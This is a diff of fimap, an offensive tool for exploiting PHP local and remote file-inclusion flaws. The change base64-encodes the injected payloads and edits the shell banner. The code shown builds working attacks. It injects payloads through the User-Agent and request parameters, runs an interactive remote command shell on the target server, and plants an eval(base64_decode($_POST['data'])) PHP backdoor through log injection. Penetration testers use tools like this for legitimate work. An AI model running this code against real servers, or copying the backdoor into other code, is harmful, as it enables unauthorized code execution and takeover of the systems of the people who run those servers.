@@ -1,6 +1,3 @@
-from base64 import b64encode
-import shutil
-import os
 #
 # This file is part of fimap.
 #
@@ -20,7 +17,9 @@ import os
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 #
-
+import base64
+import shutil
+import os
 import sys
 from baseClass import baseClass
 from config import settings
@@ -32,6 +31,8 @@ __date__ ="$03.09.2009 03:40:49$"
 shell_banner =  "-------------------------------------------\n" + \
                 "Welcome to fimap shell!\n" + \
                 "Better don't start interactive commands! ;)\n" +\
+                "Also remember that this is not a persistent shell.\n" +\
+                "Every command opens a new shell and quits it after that!\n" +\
                 "Enter 'q' to exit the shell.\n"+\
                 "-------------------------------------------"
 
@@ -109,7 +110,7 @@ class codeinjector(baseClass):
             for item in settings["php_exec"]:
                 name, payload = item
                 self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
-                testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
+                testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
                 if (mode.find("A") != -1):
                     self.globSet.setUserAgent(testload)
                     code = self.doGetRequest(url)
@@ -135,7 +136,7 @@ class codeinjector(baseClass):
                     if (attack == "fimap_shell"):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
-                        pwd_cmd = payload.replace("__PAYLOAD__", "pwd")
+                        pwd_cmd = payload.replace("__PAYLOAD__", base64.b64encode("pwd"))
                         curdir = self.__doHaxRequest(url, mode, pwd_cmd, suffix).strip()
                         print shell_banner
 
@@ -144,14 +145,15 @@ class codeinjector(baseClass):
                             if cmd == "q" or cmd == "quit": break
                             
                             if (cmd.strip() != ""):
-                                userload = payload.replace("__PAYLOAD__", "cd '%s'; %s"%(curdir, cmd))
+                                userload = payload.replace("__PAYLOAD__", base64.b64encode("cd '%s'; %s"%(curdir, cmd)))
                                 code = self.__doHaxRequest(url, mode, userload, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
-                                    cmd = payload.replace("__PAYLOAD__", cmd)
+                                    cmd = payload.replace("__PAYLOAD__", base64.b64encode(cmd))
                                     curdir = self.__doHaxRequest(url, mode, cmd , suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
+                        print "Do not forget to close this security hole."
                         sys.exit(0)
                     else:
                         print "Strange stuff..."
@@ -160,20 +162,20 @@ class codeinjector(baseClass):
                     attack    = attack[1]
 
                     questions = attack[0]
-                    payload   = attack[1]
+                    cpayload   = attack[1]
 
                     if (questions != None):
                         for q, p in questions:
                             v = raw_input(q)
-                            payload = payload.replace(p, v)
+                            cpayload = cpayload.replace(p, v)
 
                     shellcode = None
 
                     if (typ=="php"):
-                        shellcode = payload
+                        shellcode = cpayload
                     elif (typ=="sys"):
                         shellcode = working_shell[1]
-                        shellcode = shellcode.replace("__PAYLOAD__", payload)
+                        shellcode = shellcode.replace("__PAYLOAD__", base64.b64encode(cpayload))
 
 
                     code = self.__doHaxRequest(url, mode, shellcode, appendix)
@@ -202,7 +204,7 @@ class codeinjector(baseClass):
             if (not self.isLogKickstarterPresent):
                 self._log("Testing if log kickstarter is present...", self.globSet.LOG_INFO)
                 testcode = self.getPHPQuiz()
-                code = self.doPostRequest(url, "data=" + b64encode(testcode[0]))
+                code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
                 if (code.find(testcode[1]) == -1):
                     self._log("Kickstarter is not present. Injecting kickstarter...", self.globSet.LOG_INFO)
                     kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
@@ -214,7 +216,7 @@ class codeinjector(baseClass):
                     
                     self._log("Testing once again if kickstarter is present...", self.globSet.LOG_INFO)
                     testcode = self.getPHPQuiz()
-                    code = self.doPostRequest(url, "data=" + b64encode(testcode[0]))
+                    code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
 
                     if (code.find(testcode[1]) == -1):
                         self._log("Failed to inject kickstarter!", self.globSet.LOG_ERROR)
@@ -277,8 +279,9 @@ class codeinjector(baseClass):
             
 
     def convertUserloadToLogInjection(self, userload):
-        userload = userload.replace("<?", "").replace("?>", "")
-        userload = "data=" + b64encode(userload).replace("+", "%2B").replace("=", "%3D")
+        userload = userload.replace("<?php", "").replace("?>", "")
+        userload = userload.replace("<?", "")
+        userload = "data=" + base64.b64encode(userload).replace("+", "%2B").replace("=", "%3D")
         return(userload)
 
 
